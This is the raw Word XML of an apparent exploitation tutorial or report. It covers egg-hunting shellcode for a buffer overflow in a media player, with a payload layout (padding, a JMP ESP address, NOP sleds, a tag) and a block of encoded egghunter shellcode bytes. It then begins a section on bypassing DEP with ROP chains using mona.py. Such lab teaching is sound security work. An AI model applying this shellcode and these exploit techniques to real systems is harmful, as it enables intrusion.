            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B54016A" w14:textId="14BE1C5A" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="00941EC1"/>
    <w:p w14:paraId="5C526828" w14:textId="02ADDDAA" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="00941EC1"/>
    <w:p w14:paraId="30862B65" w14:textId="03D41DAF" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="00941EC1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251700224" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3B5A8E66" wp14:editId="05644BC7">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1200150</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>96520</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3238500" cy="635"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTight wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="0" y="0"/>
                    <wp:lineTo x="0" y="20057"/>
                    <wp:lineTo x="21473" y="20057"/>
                    <wp:lineTo x="21473"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3D582B07" w14:textId="0F81D3BB" w:rsidR="000C15D0" w:rsidRPr="005061C9" w:rsidRDefault="000C15D0" w:rsidP="000C15D0">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">Figure </w:t>
                            </w:r>
                            <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                              <w:r w:rsidR="00C14656">
                                <w:rPr>
                                  <w:noProof/>
                                </w:rPr>
                                <w:t>20</w:t>
                              </w:r>
                            </w:fldSimple>
                            <w:r>
                              <w:t xml:space="preserve"> - command prompt output after loading in the tcp.ini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5A8E66" id="Text Box 45" o:spid="_x0000_s1034" type="#_x0000_t202" style="position:absolute;margin-left:94.5pt;margin-top:7.6pt;width:255pt;height:.05pt;z-index:-251616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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="3D582B07" w14:textId="0F81D3BB" w:rsidR="000C15D0" w:rsidRPr="005061C9" w:rsidRDefault="000C15D0" w:rsidP="000C15D0">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">Figure </w:t>
                      </w:r>
                      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                        <w:r w:rsidR="00C14656">
                          <w:rPr>
                            <w:noProof/>
                          </w:rPr>
                          <w:t>20</w:t>
                        </w:r>
                      </w:fldSimple>
                      <w:r>
                        <w:t xml:space="preserve"> - command prompt output after loading in the tcp.ini file</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="tight"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="60EA75CE" w14:textId="77777777" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="00941EC1"/>
    <w:p w14:paraId="631D6AC5" w14:textId="6D5F6F7A" w:rsidR="000C15D0" w:rsidRPr="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="00941EC1">
      <w:r>
        <w:t xml:space="preserve">This signifies that the payload </w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t>works,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and a connection was established.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E155F6E" w14:textId="01448CD7" w:rsidR="006E1444" w:rsidRDefault="00D71CF0" w:rsidP="006E1444">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc102919477"/>
      <w:bookmarkStart w:id="28" w:name="_Toc103326465"/>
      <w:r>
        <w:t>Egg-hunting Shellcode</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="00D8EBF5" w14:textId="12F20A4E" w:rsidR="00044ED7" w:rsidRDefault="00882794" w:rsidP="0099242C">
      <w:r>
        <w:t>In the event that there is not enough room for any shellcod</w:t>
      </w:r>
      <w:r w:rsidR="003112D2">
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00044ED7">
        <w:t xml:space="preserve">, Egg-Hunter shellcode should be utilized. This technique hides the shellcode among the initial A’s (or way above the stack, where there is space), and is accessed through the use of ‘tags’, </w:t>
      </w:r>
      <w:r w:rsidR="002834C9">
        <w:t>which the Egghunter will look for</w:t>
      </w:r>
      <w:r w:rsidR="003112D2">
        <w:t xml:space="preserve"> before finding </w:t>
      </w:r>
      <w:r w:rsidR="002834C9">
        <w:t>the code</w:t>
      </w:r>
      <w:r w:rsidR="003112D2">
        <w:t xml:space="preserve"> and executing it</w:t>
      </w:r>
      <w:r w:rsidR="00044ED7">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F31363" w14:textId="3F265BF9" w:rsidR="00F51BD8" w:rsidRDefault="00F51BD8" w:rsidP="0099242C">
      <w:r>
        <w:t xml:space="preserve">To create the exploit code, an egghunter.pl file must be created with the following information, most of which </w:t>
      </w:r>
      <w:r w:rsidR="00653E91">
        <w:t>can be pieced together from data in</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> previous files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0311CF" w14:textId="75EEDA59" w:rsidR="00F51BD8" w:rsidRDefault="00F51BD8" w:rsidP="00F51BD8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">“A” x 484 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673B7CD8" w14:textId="373A6FEC" w:rsidR="00F51BD8" w:rsidRDefault="00F51BD8" w:rsidP="00F51BD8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>JMP ESP (‘V’, 0x7C86467B)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E48C85" w14:textId="5B0E6216" w:rsidR="00F51BD8" w:rsidRDefault="00F51BD8" w:rsidP="00F51BD8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">NOP sled (“\x90” x </w:t>
      </w:r>
      <w:r w:rsidR="00653E91">
        <w:t>15</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F49E13" w14:textId="4098F5AD" w:rsidR="00F51BD8" w:rsidRDefault="00653E91" w:rsidP="00F51BD8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Egghunter code (encoded in </w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:t>Alpha_upper</w:t>
      </w:r>
      <w:r w:rsidR="004D7F6C">
        <w:t>, looking for tag “w00tw00t”</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1208D0D4" w14:textId="2DF68383" w:rsidR="00653E91" w:rsidRDefault="00653E91" w:rsidP="00F51BD8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Another NOP sled, used here to simulate a large distance in the stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65200A7C" w14:textId="7E7376E4" w:rsidR="00653E91" w:rsidRDefault="004D7F6C" w:rsidP="00F51BD8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>w00tw00t tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6C04C8" w14:textId="114304EF" w:rsidR="004D7F6C" w:rsidRDefault="00653E91" w:rsidP="004D7F6C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Shellcode (calculator, </w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:t>message box</w:t>
      </w:r>
      <w:r>
        <w:t>, reverse shell etc.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDBAB04" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C"/>
    <w:p w14:paraId="2D4D00D4" w14:textId="18166567" w:rsidR="004D7F6C" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251702272" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2500F7A6" wp14:editId="3448BEC6">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>828040</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4410075" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="2857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0075" cy="1404620"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="194F936D" w14:textId="1706156D" w:rsidR="004D7F6C" w:rsidRPr="004D7F6C" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:rPr>
                                <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="004D7F6C">
                              <w:rPr>
                                <w:rStyle w:val="codeChar"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>x89\xe0\xda\xc0\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x43\x56\x4d\x51\x49\x5a\x4b\x4f\x44\x4f\x51\x52\x46\x32\x43\x5a\x4\x42\x50\x58\x48\x4d\x46\x4e\x47\x4c\x43\x35\x51\x4a\x42\x54\x4a\x4f\x4e\x58\x42\x57\x46\x50\x46\x50\x44\x34\x4c\x4b\x4b\x4a\x4e\x4f\x44\x35\x4b\x5a\x4e\x4f\x43\x45\x4b\x57\x4b\x4f\x4d\x37\x41\x41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00F7A6" id="_x0000_s1035" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:65.2pt;margin-top:0;width:347.25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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w14:paraId="194F936D" w14:textId="1706156D" w:rsidR="004D7F6C" w:rsidRPr="004D7F6C" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="004D7F6C">
                        <w:rPr>
                          <w:rStyle w:val="codeChar"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>x89\xe0\xda\xc0\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x43\x56\x4d\x51\x49\x5a\x4b\x4f\x44\x4f\x51\x52\x46\x32\x43\x5a\x4\x42\x50\x58\x48\x4d\x46\x4e\x47\x4c\x43\x35\x51\x4a\x42\x54\x4a\x4f\x4e\x58\x42\x57\x46\x50\x46\x50\x44\x34\x4c\x4b\x4b\x4a\x4e\x4f\x44\x35\x4b\x5a\x4e\x4f\x43\x45\x4b\x57\x4b\x4f\x4d\x37\x41\x41</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="551B2987" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRDefault="004D7F6C" w:rsidP="00653E91"/>
    <w:p w14:paraId="56F0F731" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRDefault="004D7F6C" w:rsidP="00653E91"/>
    <w:p w14:paraId="6761924D" w14:textId="2E3CD5FE" w:rsidR="004D7F6C" w:rsidRDefault="004D7F6C" w:rsidP="00653E91">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251704320" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1031E1B1" wp14:editId="40EEA4C3">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>780415</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>186690</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="441007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wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="227D2A07" w14:textId="7D46AA0D" w:rsidR="004D7F6C" w:rsidRPr="00560DFC" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:jc w:val="center"/>
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">Figure </w:t>
                            </w:r>
                            <w:r w:rsidR="00C34234">
                              <w:fldChar w:fldCharType="begin"/>
                            </w:r>
                            <w:r w:rsidR="00C34234">
                              <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
                            </w:r>
                            <w:r w:rsidR="00C34234">
                              <w:fldChar w:fldCharType="separate"/>
                            </w:r>
                            <w:r w:rsidR="00C14656">
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                              <w:t>21</w:t>
                            </w:r>
                            <w:r w:rsidR="00C34234">
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                              <w:fldChar w:fldCharType="end"/>
                            </w:r>
                            <w:r>
                              <w:t xml:space="preserve"> - Egghunter (w00tw00t)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31E1B1" id="Text Box 7" o:spid="_x0000_s1036" type="#_x0000_t202" style="position:absolute;margin-left:61.45pt;margin-top:14.7pt;width:347.2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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="227D2A07" w14:textId="7D46AA0D" w:rsidR="004D7F6C" w:rsidRPr="00560DFC" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">Figure </w:t>
                      </w:r>
                      <w:r w:rsidR="00C34234">
                        <w:fldChar w:fldCharType="begin"/>
                      </w:r>
                      <w:r w:rsidR="00C34234">
                        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
                      </w:r>
                      <w:r w:rsidR="00C34234">
                        <w:fldChar w:fldCharType="separate"/>
                      </w:r>
                      <w:r w:rsidR="00C14656">
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                        <w:t>21</w:t>
                      </w:r>
                      <w:r w:rsidR="00C34234">
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                        <w:fldChar w:fldCharType="end"/>
                      </w:r>
                      <w:r>
                        <w:t xml:space="preserve"> - Egghunter (w00tw00t)</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D99447" w14:textId="6EEA463D" w:rsidR="004D7F6C" w:rsidRDefault="004D7F6C" w:rsidP="00653E91"/>
    <w:p w14:paraId="3678B136" w14:textId="6EE6A115" w:rsidR="00653E91" w:rsidRDefault="00653E91" w:rsidP="00653E91">
      <w:r>
        <w:t>Adding all</w:t>
      </w:r>
      <w:r w:rsidR="004D7F6C">
        <w:t xml:space="preserve"> of the above together into a file should give the following result, found in </w:t>
      </w:r>
      <w:r w:rsidR="004D7F6C" w:rsidRPr="004D7F6C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Appendix B</w:t>
      </w:r>
      <w:r w:rsidR="00CF75AD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="004D7F6C">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDBCEC6" w14:textId="59EC9878" w:rsidR="0099242C" w:rsidRPr="0099242C" w:rsidRDefault="00CF75AD" w:rsidP="0099242C">
      <w:r>
        <w:t>Double-clicking on this .pl file should create a new ‘egghunt.ini’ file on the desktop, which can be uploaded to the application to produce a message box, suggesting the Egghunter code works correctly</w:t>
      </w:r>
      <w:r w:rsidR="00E72F21">
        <w:t xml:space="preserve"> and the Egghunter covered the necessary distance</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AA2F88" w14:textId="294BB132" w:rsidR="006E1444" w:rsidRPr="006E1444" w:rsidRDefault="00F8417D" w:rsidP="006E1444">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc102919478"/>
      <w:bookmarkStart w:id="30" w:name="_Toc103326466"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Tutorial</w:t>
      </w:r>
      <w:r w:rsidR="00D71CF0">
        <w:t xml:space="preserve"> 2 – </w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
      <w:r w:rsidR="002834C9">
        <w:t>Overcoming DEP with ROP Chains</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
      <w:r w:rsidR="00F51BD8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F692F41" w14:textId="1EE8E173" w:rsidR="002834C9" w:rsidRDefault="002834C9" w:rsidP="003E5FAC">
      <w:bookmarkStart w:id="31" w:name="_Toc102919479"/>
      <w:r>
        <w:t>DEP (Data Execution Prevention) is a technique used by Microsoft to prevent attackers from exploiting stack buffer overflows as demonstrated in the previous tutorial. As summarized in Section 1.1.3, DEP can be used to prevent parts of memory from executing shellcode and requires the use of ROP chains</w:t>
      </w:r>
      <w:r w:rsidR="00382E34">
        <w:t>, explained in Section 2.6.1,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be circumvented.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F5E729" w14:textId="44440BBE" w:rsidR="002834C9" w:rsidRDefault="002834C9" w:rsidP="003E5FAC">
      <w:r>
        <w:t>To enable DEP, right click on My Computer, then navigate to [System Properties -&gt; Advanced -&gt; Performance -&gt; Data Execution Prevention] and click “Turn on DEP for all programs…”. Now apply the changes and reboot the machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3CE753" w14:textId="77777777" w:rsidR="002834C9" w:rsidRDefault="002834C9" w:rsidP="002834C9">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40D78E35" wp14:editId="28774BAA">
            <wp:extent cx="4286250" cy="320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86250" cy="3200400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="52312435" w14:textId="26B718D2" w:rsidR="003E5FAC" w:rsidRDefault="002834C9" w:rsidP="002834C9">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00C34234">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00C34234">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00C34234">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00C14656">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>22</w:t>
      </w:r>
      <w:r w:rsidR="00C34234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - DEP window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0741B444" w14:textId="77777777" w:rsidR="002834C9" w:rsidRPr="002834C9" w:rsidRDefault="002834C9" w:rsidP="002834C9"/>
    <w:p w14:paraId="3272F1D2" w14:textId="71E75191" w:rsidR="00D71CF0" w:rsidRDefault="00D71CF0" w:rsidP="00E07AE9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc103326467"/>
      <w:r>
        <w:t>ROP Chains</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="021B772B" w14:textId="655D7933" w:rsidR="009525A9" w:rsidRDefault="00382E34" w:rsidP="008332D2">
      <w:r>
        <w:t xml:space="preserve">Since DEP prevents shellcode execution using the methods shown throughout Tutorial 1 by marking the stack as non-executable, it is necessary to make use of ROP chains to circumvent this. ROP or </w:t>
      </w:r>
      <w:r w:rsidR="00034B9A">
        <w:t>‘</w:t>
      </w:r>
      <w:r>
        <w:t>Return Oriented Programming</w:t>
      </w:r>
      <w:r w:rsidR="00034B9A">
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> makes use of the EIP, which we still have control over, to jump around locations in the memory with Jump (JMP) and Return (RTN) instructions to guide the program into executing the shellcode. This long list of instructions is where the term </w:t>
      </w:r>
      <w:r w:rsidR="00034B9A">
        <w:t>‘</w:t>
      </w:r>
      <w:r>
        <w:t>ROP Chain</w:t>
      </w:r>
      <w:r w:rsidR="00034B9A">
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> comes from, as it is a long chain of JMP and RET instructions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72318D87" w14:textId="3420D703" w:rsidR="000F4B5C" w:rsidRDefault="00034B9A" w:rsidP="008332D2">
      <w:r>
        <w:t>The issue lies in the reason these instructions are</w:t>
      </w:r>
      <w:r w:rsidR="000F4B5C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>chained. This is because many RET commands, required for returning to the shellcode, are being paired with addition or subtraction functions which can cause problems with precisely landing in memory locations. These commands are called ‘Gadgets’, and finally returning to the shellcode can take many dozens of gadgets depending on their ADD or SUB quirks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44CBC9C7" w14:textId="5560279D" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="008332D2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>See Appendix C1 for a full visualisation of the process.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E110DE5" w14:textId="6AE68D79" w:rsidR="00D87FE7" w:rsidRPr="00D87FE7" w:rsidRDefault="00D87FE7" w:rsidP="00D87FE7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc103326468"/>
      <w:r>
        <w:t>Creating the ROP chains with mona.py</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="64DC8D39" w14:textId="349B856F" w:rsidR="001A3AB1" w:rsidRDefault="001A3AB1" w:rsidP="008332D2">
      <w:r>
        <w:t xml:space="preserve">To make use of ROP chains, first download mona.py and place it into the Immunity Debugger PyCommands folder [C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands]. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DBEF9A" w14:textId="2F231977" w:rsidR="00E74F68" w:rsidRDefault="00E74F68" w:rsidP="008332D2">
      <w:r>
        <w:t>Using Immunity, run the media player. Then in the bottom left input box, highlighted in red on Figure 23, enter the following.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545F57E2" w14:textId="77777777" w:rsidR="00E74F68" w:rsidRDefault="00E74F68" w:rsidP="008332D2"/>
    <w:p w14:paraId="0C3E38F3" w14:textId="5B361F15" w:rsidR="00E74F68" w:rsidRDefault="00E74F68" w:rsidP="00E74F68">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46533E32" wp14:editId="0285EEA4">
            <wp:extent cx="4286250" cy="1485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86250" cy="1485900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D08481" w14:textId="7870B634" w:rsidR="00E74F68" w:rsidRDefault="00E74F68" w:rsidP="00E74F68">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Debugger input box for mona.py</w:t>
      </w:r>
      <w:r w:rsidR="001B21C2">
        <w:t>, where -m is the module and -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001B21C2">
        <w:t>cpb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001B21C2">
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidR="002460EF">
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidR="001B21C2">
        <w:t xml:space="preserve"> bad character removal.</w:t>
      </w:r>
    </w:p>
